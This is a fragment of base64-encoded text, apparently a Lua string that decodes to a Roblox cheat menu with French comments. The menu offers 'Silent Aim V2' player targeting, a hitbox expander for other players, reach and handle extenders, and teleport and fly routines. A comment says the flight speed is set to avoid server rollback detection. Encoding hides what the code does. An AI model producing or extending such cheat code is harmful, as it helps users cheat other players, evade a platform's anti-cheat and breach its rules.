YXRpb24iLCAiWm9uZUR1cmF0aW9uIiwgMjUpCiAgICBjcmVhdGVJbnB1dChQYWdlcy5BaW0sICJDb29sZG93biAocykiLCAiWm9uZUNvb2xkb3duIiwgMjYpCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuQWltLCAiU2lsZW50IEFpbSBWMiIsIDI3KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkFpbSwgIkVuYWJsZSBTaWxlbnQgQWltIFYyIiwgIkN1cnNvckxvY2siLCAyOCkKICAgIAogICAgLS0gRHJvcGRvd24gcG91ciBTaWxlbnQgQWltIFYyIChDdXJzb3IgTG9jaykKICAgIGRvCiAgICAgICAgbG9jYWwgRHJvcEZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgRHJvcEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgRHJvcEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgICAgIERyb3BGcmFtZS5MYXlvdXRPcmRlciA9IDI5CiAgICAgICAgRHJvcEZyYW1lLlBhcmVudCA9IFBhZ2VzLkFpbQogICAgICAgIAogICAgICAgIGxvY2FsIERyb3BDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRHJvcENvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAzKSBEcm9wQ29ybmVyLlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIGxvY2FsIERyb3BTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikgRHJvcFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDM1LCAzNSwgNDUpIERyb3BTdHJva2UuVGhpY2tuZXNzID0gMSBEcm9wU3Ryb2tlLlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIAogICAgICAgIGxvY2FsIERyb3BMYWJlbCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKICAgICAgICBEcm9wTGFiZWwuVGV4dCA9ICJUYXJnZXQgVXNlciIKICAgICAgICBEcm9wTGFiZWwuU2l6ZSA9IFVEaW0yLm5ldygwLjQsIDAsIDEsIDApCiAgICAgICAgRHJvcExhYmVsLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgRHJvcExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgIERyb3BMYWJlbC5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgICAgIERyb3BMYWJlbC5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgICAgIERyb3BMYWJlbC5UZXh0U2l6ZSA9IDkKICAgICAgICBEcm9wTGFiZWwuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgbG9jYWwgRHJvcFBhZCA9IEluc3RhbmNlLm5ldygiVUlQYWRkaW5nIikgRHJvcFBhZC5QYWRkaW5nTGVmdCA9IFVEaW0ubmV3KDAsIDEwKSBEcm9wUGFkLlBhcmVudCA9IERyb3BMYWJlbAogICAgICAgIAogICAgICAgIGxvY2FsIERyb3BCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgICAgIERyb3BCdG4uU2l6ZSA9IFVEaW0yLm5ldygwLjU1LCAwLCAwLjcsIDApCiAgICAgICAgRHJvcEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjQyLCAwLCAwLjE1LCAwKQogICAgICAgIERyb3BCdG4uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDMwLCAzMCwgNDApCiAgICAgICAgRHJvcEJ0bi5UZXh0Q29sb3IzID0gQ3VycmVudFRoZW1lQ29sb3IKICAgICAgICBEcm9wQnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgICAgIERyb3BCdG4uVGV4dFNpemUgPSA4CiAgICAgICAgRHJvcEJ0bi5UZXh0ID0gKENvbmZpZy5DdXJzb3JMb2NrVXNlciB+PSAiIiBhbmQgQ29uZmlnLkN1cnNvckxvY2tVc2VyKSBvciAiTm9uZSIKICAgICAgICBEcm9wQnRuLlBhcmVudCA9IERyb3BGcmFtZQogICAgICAgIGxvY2FsIERCQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpIERCQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpIERCQ29ybmVyLlBhcmVudCA9IERyb3BCdG4KICAgICAgICAKICAgICAgICBsb2NhbCBEcm9wTGlzdCA9IEluc3RhbmNlLm5ldygiU2Nyb2xsaW5nRnJhbWUiKQogICAgICAgIERyb3BMaXN0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAwLCAxNTApCiAgICAgICAgRHJvcExpc3QuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgNSwgMCwgMzUpCiAgICAgICAgRHJvcExpc3QuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzApCiAgICAgICAgRHJvcExpc3QuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgIERyb3BMaXN0LlZpc2libGUgPSBmYWxzZQogICAgICAgIERyb3BMaXN0LlNjcm9sbEJhclRoaWNrbmVzcyA9IDIKICAgICAgICBEcm9wTGlzdC5BdXRvbWF0aWNDYW52YXNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlkKICAgICAgICBEcm9wTGlzdC5aSW5kZXggPSA1CiAgICAgICAgRHJvcExpc3QuUGFyZW50ID0gRHJvcEZyYW1lCiAgICAgICAgbG9jYWwgRExDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikgRExDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykgRExDb3JuZXIuUGFyZW50ID0gRHJvcExpc3QKICAgICAgICBsb2NhbCBETExheW91dCA9IEluc3RhbmNlLm5ldygiVUlMaXN0TGF5b3V0IikgRExMYXlvdXQuU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIgRExMYXlvdXQuUGFyZW50ID0gRHJvcExpc3QKICAgICAgICAKICAgICAgICBsb2NhbCBpc0Ryb3BPcGVuID0gZmFsc2UKICAgICAgICBEcm9wQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpc0Ryb3BPcGVuID0gbm90IGlzRHJvcE9wZW4KICAgICAgICAgICAgRHJvcExpc3QuVmlzaWJsZSA9IGlzRHJvcE9wZW4KICAgICAgICAgICAgaWYgaXNEcm9wT3BlbiB0aGVuCiAgICAgICAgICAgICAgICBEcm9wRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAxOTApCiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhEcm9wTGlzdDpHZXRDaGlsZHJlbigpKSBkbyBpZiB2OklzQSgiVGV4dEJ1dHRvbiIpIHRoZW4gdjpEZXN0cm95KCkgZW5kIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBhZGRPcHRpb24obmFtZSwgdmFsKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgICAgICAgICAgYnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICAgICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgYnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0ID0gbmFtZQogICAgICAgICAgICAgICAgICAgIGJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbQogICAgICAgICAgICAgICAgICAgIGJ0bi5UZXh0U2l6ZSA9IDgKICAgICAgICAgICAgICAgICAgICBidG4uWkluZGV4ID0gNgogICAgICAgICAgICAgICAgICAgIGJ0bi5QYXJlbnQgPSBEcm9wTGlzdAogICAgICAgICAgICAgICAgICAgIGJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgQ29uZmlnLkN1cnNvckxvY2tVc2VyID0gdmFsCiAgICAgICAgICAgICAgICAgICAgICAgIERyb3BCdG4uVGV4dCA9IHZhbCA9PSAiIiBhbmQgIk5vbmUiIG9yIHZhbAogICAgICAgICAgICAgICAgICAgICAgICBpc0Ryb3BPcGVuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgRHJvcExpc3QuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIERyb3BGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBhZGRPcHRpb24oIi0tIE5vbmUgLS0iLCAiIikKICAgICAgICAgICAgICAgIGZvciBfLCBwIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHAgfj0gcGxheWVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWRkT3B0aW9uKHAuRGlzcGxheU5hbWUgLi4gIiAoQCIgLi4gcC5OYW1lIC4uICIpIiwgcC5OYW1lKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIERyb3BGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIAogICAgY3JlYXRlS2V5YmluZChQYWdlcy5BaW0sICJBY3RpdmF0ZS9DaGFuZ2UgTG9jayIsICJDdXJzb3JMb2NrS2V5IiwgMjkpCiAgICBjcmVhdGVLZXliaW5kKFBhZ2VzLkFpbSwgIkRpc2FibGUgTG9jayBLZXkiLCAiQ3Vyc29yTG9ja0Rpc2FibGVLZXkiLCAzMCkKICAgIAogICAgbG9jYWwgQ3Vyc29yTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBDdXJzb3JMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIwKQogICAgQ3Vyc29yTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIEN1cnNvckxhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDE1MCwgMTUwKQogICAgQ3Vyc29yTGFiZWwuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KICAgIEN1cnNvckxhYmVsLlRleHRTaXplID0gOAogICAgQ3Vyc29yTGFiZWwuVGV4dCA9ICJTdGF0dXM6IFVubG9ja2VkIgogICAgQ3Vyc29yTGFiZWwuTGF5b3V0T3JkZXIgPSAzMQogICAgQ3Vyc29yTGFiZWwuUGFyZW50ID0gUGFnZXMuQWltCiAgICAKICAgIGlmIFRvZ2dsZUJ1dHRvbnNbIkN1cnNvckxvY2siXSB0aGVuCiAgICAgICAgVG9nZ2xlQnV0dG9uc1siQ3Vyc29yTG9jayJdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBpZiBub3QgQ29uZmlnLkN1cnNvckxvY2sgdGhlbgogICAgICAgICAgICAgICAgY3Vyc29yTG9ja1RhcmdldCA9IG5pbAogICAgICAgICAgICAgICAgQ3Vyc29yTGFiZWwuVGV4dCA9ICJTdGF0dXM6IFVubG9ja2VkIgogICAgICAgICAgICAgICAgQ3Vyc29yTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1MCwgMTUwLCAxNTApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAogICAgCiAgICAtLSBIaXRib3ggVGFiIChOZXcpCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLkhpdGJveCwgIkhpdGJveCBFeHAgUGxheWVyIiwgMSkKICAgIGNyZWF0ZVRvZ2dsZShQYWdlcy5IaXRib3gsICJFbmFibGUgSGl0Ym94IEV4cGFuZGVyIiwgIkhpdGJveEV4cGFuZGVyIiwgMikKICAgIGNyZWF0ZVNsaWRlcihQYWdlcy5IaXRib3gsICJIaXRib3ggTXVsdGlwbGllciIsICJIaXRib3hTaXplIiwgMywgMSwgMzAwLCAyKQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLkhpdGJveCwgIkhpdGJveCBUcmFuc3BhcmVuY3kiLCAiSGl0Ym94VHJhbnNwYXJlbmN5IiwgNCwgMCwgMSwgMC43KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkhpdGJveCwgIlRhcmdldCBBbGwgUGxheWVycyIsICJIaXRib3hNb2RlQWxsIiwgNSkKICAgIGNyZWF0ZUlucHV0KFBhZ2VzLkhpdGJveCwgIlRhcmdldCBVc2VybmFtZSIsICJIaXRib3hUYXJnZXRVc2VyIiwgNikKICAgIAogICAgY3JlYXRlU2VjdGlvbihQYWdlcy5IaXRib3gsICJTZWxmIEhpdGJveCBFeHAiLCA3KQogICAgY3JlYXRlVG9nZ2xlKFBhZ2VzLkhpdGJveCwgIkVuYWJsZSBSZWFjaCIsICJSZWFjaCIsIDgpCiAgICBjcmVhdGVTbGlkZXIoUGFnZXMuSGl0Ym94LCAiUmVhY2ggTXVsdGlwbGllciIsICJSZWFjaFNpemUiLCA5LCAxLCAzMDAsIDIpIAogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLkhpdGJveCwgIlJlYWNoIE11bHRpcGxpZXIiLCAiUmVhY2hTaXplIiwgOSwgMSwgMjAwMCwgMikgCiAgICBjcmVhdGVTbGlkZXIoUGFnZXMuSGl0Ym94LCAiUmVhY2ggVHJhbnNwYXJlbmN5IiwgIlJlYWNoVHJhbnNwYXJlbmN5IiwgMTAsIDAsIDEsIDAuNSkgCiAgICAKICAgIGNyZWF0ZVNlY3Rpb24oUGFnZXMuSGl0Ym94LCAiSGFuZGxlIEV4dGVuZGVyIiwgMTEpCiAgICBjcmVhdGVUb2dnbGUoUGFnZXMuSGl0Ym94LCAiRW5hYmxlIEhhbmRsZSBFeHRlbmRlciIsICJIYW5kbGVFeHRlbmRlciIsIDEyKQogICAgY3JlYXRlU2xpZGVyKFBhZ2VzLkhpdGJveCwgIkhhbmRsZSBTaXplIiwgIkhhbmRsZVNpemUiLCAxMywgMSwgNTAsIDUpCiAgICAKICAgIC0tIFBsYXllciBUZWxlcG9ydCBPcHRpb25zIChubyBjYXRlZ29yeSkKICAgIGxvY2FsIGN1cnJlbnRUZWxlcG9ydFRocmVhZCA9IG5pbAogICAgbG9jYWwgY3VycmVudFRlbGVwb3J0VHdlZW4gPSBuaWwKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gc3RvcFRlbGVwb3J0KCkKICAgICAgICBpZiBjdXJyZW50VGVsZXBvcnRUaHJlYWQgdGhlbgogICAgICAgICAgICB0YXNrLmNhbmNlbChjdXJyZW50VGVsZXBvcnRUaHJlYWQpCiAgICAgICAgICAgIGN1cnJlbnRUZWxlcG9ydFRocmVhZCA9IG5pbAogICAgICAgIGVuZAogICAgICAgIGlmIGN1cnJlbnRUZWxlcG9ydFR3ZWVuIHRoZW4KICAgICAgICAgICAgY3VycmVudFRlbGVwb3J0VHdlZW46Q2FuY2VsKCkKICAgICAgICAgICAgY3VycmVudFRlbGVwb3J0VHdlZW4gPSBuaWwKICAgICAgICBlbmQKICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMocm9vdFBhcnQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJCb2R5VmVsb2NpdHkiKSB0aGVuIHY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgaWYgaXNPbmVTaG90QWN0aXZlIHRoZW4KICAgICAgICAgICAgaXNPbmVTaG90QWN0aXZlID0gZmFsc2UKICAgICAgICAgICAgaWYgb25lU2hvdFRocmVhZCB0aGVuCiAgICAgICAgICAgICAgICB0YXNrLmNhbmNlbChvbmVTaG90VGhyZWFkKQogICAgICAgICAgICAgICAgb25lU2hvdFRocmVhZCA9IG5pbAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBkbwogICAgICAgIGxvY2FsIFN0b3BGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgICAgIFN0b3BGcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDMwKQogICAgICAgIFN0b3BGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgICAgICBTdG9wRnJhbWUuTGF5b3V0T3JkZXIgPSAwCiAgICAgICAgU3RvcEZyYW1lLlBhcmVudCA9IFBhZ2VzLlRlbGVwb3J0CgogICAgICAgIGxvY2FsIFN0b3BDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBTdG9wQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICAgICAgU3RvcENvcm5lci5QYXJlbnQgPSBTdG9wRnJhbWUKICAgICAgICAKICAgICAgICBsb2NhbCBTdG9wQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgICAgICBTdG9wQnRuLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgICAgICBTdG9wQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgU3RvcEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgU3RvcEJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBTdG9wQnRuLlRleHRTaXplID0gOQogICAgICAgIFN0b3BCdG4uVGV4dCA9ICJTVE9QIFRFTEVQT1JUIgogICAgICAgIFN0b3BCdG4uUGFyZW50ID0gU3RvcEZyYW1lCiAgICAgICAgU3RvcEJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KHN0b3BUZWxlcG9ydCkKICAgIGVuZAogICAgCiAgICBjcmVhdGVTZWN0aW9uKFBhZ2VzLlRlbGVwb3J0LCAiVGVsZXBvcnQgU2VhIDIiLCA1KQogICAgCiAgICBkbwogICAgbG9jYWwgQ2FmZUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBDYWZlRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIENhZmVGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKICAgIENhZmVGcmFtZS5MYXlvdXRPcmRlciA9IDYKICAgIENhZmVGcmFtZS5QYXJlbnQgPSBQYWdlcy5UZWxlcG9ydAoKICAgIGxvY2FsIENhZmVDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIENhZmVDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMykKICAgIENhZmVDb3JuZXIuUGFyZW50ID0gQ2FmZUZyYW1lCiAgICAKICAgIGxvY2FsIENhZmVCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQogICAgQ2FmZUJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBDYWZlQnRuLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBDYWZlQnRuLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQogICAgQ2FmZUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIENhZmVCdG4uVGV4dFNpemUgPSA5CiAgICBDYWZlQnRuLlRleHQgPSAiVGVsZXBvcnQgdG8gQ2Fmw6kiCiAgICBDYWZlQnRuLlBhcmVudCA9IENhZmVGcmFtZQogICAgCiAgICBDYWZlQnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICBzdG9wVGVsZXBvcnQoKQogICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUaHJlYWQgPSB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoMjI4MS4yMywgMTQuMjUsIDkxMC40NSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSBDRnJhbWUubmV3KC0zNzguNjEsIDE4NS4yMCwgMzA1Ljk3KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUaHJlYWQgPSBuaWwKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQogICAgZW5kCiAgICAKICAgIGRvCiAgICBsb2NhbCBSZW1vdGVGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgUmVtb3RlRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIFJlbW90ZUZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgUmVtb3RlRnJhbWUuTGF5b3V0T3JkZXIgPSA4CiAgICBSZW1vdGVGcmFtZS5QYXJlbnQgPSBQYWdlcy5UZWxlcG9ydAoKICAgIGxvY2FsIFJlbW90ZUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgUmVtb3RlQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICBSZW1vdGVDb3JuZXIuUGFyZW50ID0gUmVtb3RlRnJhbWUKICAgIAogICAgbG9jYWwgUmVtb3RlQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIFJlbW90ZUJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBSZW1vdGVCdG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFJlbW90ZUJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIFJlbW90ZUJ0bi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFJlbW90ZUJ0bi5UZXh0U2l6ZSA9IDkKICAgIFJlbW90ZUJ0bi5UZXh0ID0gIlRlbGVwb3J0IHRvIFJlbW90ZSIKICAgIFJlbW90ZUJ0bi5QYXJlbnQgPSBSZW1vdGVGcmFtZQogICAgCiAgICBSZW1vdGVCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgIHN0b3BUZWxlcG9ydCgpCiAgICAgICAgICAgIGN1cnJlbnRUZWxlcG9ydFRocmVhZCA9IHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygtMjg5LjE0LCAzMDQuOTYsIDU5Mi42OSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSAyLiBQb3NpdGlvbiBkZSBkw6lwYXJ0IGR1IEZseQogICAgICAgICAgICAgICAgbG9jYWwgc3RhcnRQb3MgPSBWZWN0b3IzLm5ldygyMjg0LjgxLCAxNC4yNSwgODk5LjMwKQogICAgICAgICAgICAgICAgbG9jYWwgZW5kUG9zID0gVmVjdG9yMy5uZXcoNDU0Ni4xOCwgNTMuODEsIDI3MTEuODUpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoc3RhcnRQb3MpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUp" .. "CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIDMuIEZseSB2ZXJzIGxhIGRlc3RpbmF0aW9uIChUd2VlbikKICAgICAgICAgICAgICAgIGlmIGNoYXJhY3RlciBhbmQgcm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAoZW5kUG9zIC0gc3RhcnRQb3MpLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNwZWVkID0gMjc1IC0tIFZpdGVzc2UgbW9kw6lyw6llIHBvdXIgw6l2aXRlciBsZSByb2xsYmFjawogICAgICAgICAgICAgICAgICAgIGxvY2FsIGR1cmF0aW9uID0gZGlzdCAvIHNwZWVkCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gU2V0dXAgQW50aS1HcmF2aXR5CiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgYnYuUGFyZW50ID0gcm9vdFBhcnQKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KGR1cmF0aW9uLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhcikKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUocm9vdFBhcnQsIHR3ZWVuSW5mbywge0NGcmFtZSA9IENGcmFtZS5uZXcoZW5kUG9zKX0pCiAgICAgICAgICAgICAgICAgICAgY3VycmVudFRlbGVwb3J0VHdlZW4gPSB0d2VlbgogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHR3ZWVuOlBsYXkoKQogICAgICAgICAgICAgICAgICAgIHR3ZWVuLkNvbXBsZXRlZDpXYWl0KCkKICAgICAgICAgICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUd2VlbiA9IG5pbAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjdXJyZW50VGVsZXBvcnRUaHJlYWQgPSBuaWwKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kKQogICAgZW5kCiAgICAKICAgIGRvCiAgICBsb2NhbCBMYWJGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgTGFiRnJhbWUuU2l6ZSA9IFVEaW0yLm5ldygxLCAwLCAwLCAzMCkKICAgIExhYkZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMCwgMjAsIDI1KQogICAgTGFiRnJhbWUuTGF5b3V0T3JkZXIgPSA3CiAgICBMYWJGcmFtZS5QYXJlbnQgPSBQYWdlcy5UZWxlcG9ydAoKICAgIGxvY2FsIExhYkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgTGFiQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDMpCiAgICBMYWJDb3JuZXIuUGFyZW50ID0gTGFiRnJhbWUKICAgIAogICAgbG9jYWwgTGFiQnRuID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKICAgIExhYkJ0bi5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBMYWJCdG4uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIExhYkJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIExhYkJ0bi5Gb250ID0gRW51bS5Gb250Lkd